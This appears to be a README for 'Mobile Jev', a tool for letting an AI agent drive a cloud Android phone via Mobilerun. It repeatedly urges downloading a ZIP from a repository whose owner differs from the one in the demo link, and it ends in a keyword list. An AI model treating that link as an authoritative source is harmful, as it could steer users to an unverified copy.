# 🤖 Mobile Jev - Run an AI Agent on Your Real Android Phone

[![Download Mobile Jev](https://img.shields.io/badge/Download-Mobile%20Jev-brightgreen?style=for-the-badge&logo=github)](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)

## 📥 Download and Install

Visit this link to download the application: **[https://github.com/Capitalofgeorgiapolitician1569/mobile-jev](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)**

Once you land on the page, look for the green **"Code"** button. Click it, then select **"Download ZIP"**. This will save a compressed folder to your computer.

After the download finishes, right-click the ZIP file and choose **"Extract All"**. Pick a simple location like your **Desktop** or **Documents** folder. You'll now have a folder called `mobile-jev-main`.

Open that folder and look for a file named `index.html`. Double-click it — this will open the Mobile Jev interface in your web browser. That's it! You're ready to go.

---

## 🎯 What Is Mobile Jev?

Mobile Jev is a standalone application that lets you control a **real Android phone** using an AI agent. You don't need any special cables, ADB connections, or coding knowledge.

Here's what it does: You give Jev a task — like "Open Uber and set a route from the airport to the Golden Gate Bridge" — and Jev operates the phone for you. It taps buttons, types text, and navigates apps just like a person would.

This is powered by two services:
- **TypeSafe's Jev** — the AI brain that makes decisions
- **Mobilerun** — the cloud platform that runs the physical phone

All you need is this app and an account with Mobilerun (details below).

---

## ✨ Key Features

### 📱 Live Studio
A real-time React interface that shows you what Jev is doing on the phone, action by action. You'll see screen captures, button presses, and typed text as they happen.

### ⌨️ Command Line Tool
Prefer typing? Use the built-in CLI to send tasks to Jev from your terminal. Great for batch operations or scripting.

### 📋 Execution Traces
Every task Jev performs is recorded in a trace file. Review exactly what actions were taken, in what order, and how long each one took.

### ⏱️ Latency Measurement
See request-level timing for every step. Know precisely how fast Jev responds and where any delays occur.

### 🔓 No ADB Needed
Traditional phone automation requires USB debugging and special drivers. Mobile Jev eliminates all that — everything works over the cloud.

---

## 🚀 Getting Started

### Step 1: Create a Mobilerun Account

Go to [mobilerun.ai](https://mobilerun.ai) and sign up. You'll need a valid email address. During setup, you'll receive an **API key** — this is your personal password for connecting to the service.

Copy that API key and keep it handy.

### Step 2: Open Mobile Jev

Now open the `index.html` file you extracted earlier. You'll see a sidebar menu with options like:
- **Live Studio**
- **Run Task**
- **View Traces**

### Step 3: Enter Your API Key

In the **Settings** tab, paste your Mobilerun API key. The app will save it securely for future sessions.

### Step 4: Choose a Phone

Mobilerun provides virtual access to various Android devices. Pick one from the dropdown menu — any modern Android phone will work.

### Step 5: Give Jev a Task

Type your instruction in plain English. For example:
> "Open the Uber app, enter a route from San Francisco Airport to the Golden Gate Bridge, and reach the payment selection screen."

Hit **Run**, and watch the live stream as Jev does its magic.

---

## 📖 Using the Demo Guide

Inside the downloaded folder, open `docs/demo-guide.md` (or just read it on the GitHub page). This walks you through a complete example, showing:
- What to expect step-by-step
- How Jev handles unexpected screens
- How to read latency data

The recorded demo shows Jev completing 9 actions in about 21 seconds — that's roughly 2.3 seconds per action.

---

## 🛠️ Troubleshooting Tips

### The App Won't Open
- Make sure `index.html` is opened with a modern browser like **Chrome**, **Edge**, or **Firefox**
- If you see a blank page, try refreshing or restarting the browser

### Can't Connect to Mobilerun
- Double-check your API key — copy it again from your Mobilerun dashboard
- Ensure your internet connection is stable
- Verify your Mobilerun account is active (not expired or suspended)

### Task Fails Midway
- Re-read your instruction. Make sure it's clear and doesn't reference passwords or sensitive data
- Check that the app you're trying to automate (like Uber) is installed on the remote phone
- Review the execution trace to see exactly where Jev got stuck

---

## 📊 Understanding Latency Reports

When a task completes, you'll see a table with:
- **Action Number** (e.g., Action 1, Action 2)
- **Description** (what Jev did)
- **Latency** (in milliseconds or seconds)
- **Status** (success or failed)

Use this to optimize your prompts. For example, if you see huge gaps between actions, your instruction may need to be more specific.

---

## ⚙️ Advanced: Using the CLI

If you're comfortable with a command line, open a terminal (Command Prompt or PowerShell) in the `mobile-jev-main` folder. Run:

```
node cli.js --key YOUR_API_KEY --task "Your task here"
```

This triggers the same agent without the visual interface. Output will be printed directly in your terminal.

---

## 🔒 Privacy & Security

- Your Mobilerun API key is stored **locally** in your browser's local storage. It is never sent to any server except Mobilerun's official API.
- Mobile Jev does **not** collect any analytics or usage data.
- Tasks you run are recorded on your machine only, as trace files.

---

## 📞 Getting Help

If something isn't working, check these resources first:
- **Mobilerun Documentation:** [https://docs.mobilerun.ai](https://docs.mobilerun.ai)
- **TypeSafe Jev Docs:** [https://docs.typesafe.ai](https://docs.typesafe.ai)
- **TypeSafe Website:** [https://typesafe.ai](https://typesafe.ai)
- **Mobilerun Website:** [https://mobilerun.ai](https://mobilerun.ai)

Most issues are resolved by re-reading the API key input or checking the task wording.

---

## 📝 Frequently Asked Questions

### Do I need an Android phone?
No! The phone runs in the cloud through Mobilerun. You only need this computer, internet, and a Mobilerun account.

### Is this free?
Mobilerun offers trial credits for new users. After that, their pricing applies. Check their site for current rates.

### Can I automate any app?
In principle, yes — any app that works on Android. However, some apps block automation or have captchas that Jev cannot solve.

### Is there a video demo?
Yes! Click the **▶ Watch the demo** link on the GitHub page. It shows Jev navigating Uber in real time from start to payment selection.

---

## ✅ Final Checklist for Success

1. ✅ Downloaded the ZIP from [https://github.com/Capitalofgeorgiapolitician1569/mobile-jev](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)
2. ✅ Extracted the ZIP folder
3. ✅ Opened `index.html` in a modern browser
4. ✅ Created a Mobilerun account and got an API key
5. ✅ Entered the API key in Mobile Jev's settings
6. ✅ Selected a phone device
7. ✅ Wrote a clear, short task in plain English
8. ✅ Clicked Run and watched Jev work

That's all there is to it. No programming. No ADB. Just a real AI agent driving a real Android phone for you.

---

## 🧠 What's Next?

Once you master the basics, try these ideas:
- Automate repetitive app testing for your own projects
- Schedule recurring tasks using the CLI
- Combine multiple tasks into longer workflows
- Compare latency across different phone models

The power of Jev is yours to command.

---

## 🔗 Resource Links

- [Download Mobile Jev](https://github.com/Capitalofgeorgiapolitician1569/mobile-jev)
- [Mobilerun](https://mobilerun.ai)
- [Mobilerun Docs](https://docs.mobilerun.ai)
- [TypeSafe](https://typesafe.ai)
- [Jev Docs](https://docs.typesafe.ai)
- [Demo Video](https://github.com/droidrun/mobile-jev/blob/main/docs/media/uber-demo.mp4)

---

Keywords: mobile agent, android automation, Jev, Mobilerun, TypeSafe, AI agent, React studio, CLI tool, execution traces, latency measurement, no ADB, real phone control, cloud phone, task automation, Uber demo, mobile testing, AI decisions, live studio, remote phone, API key setup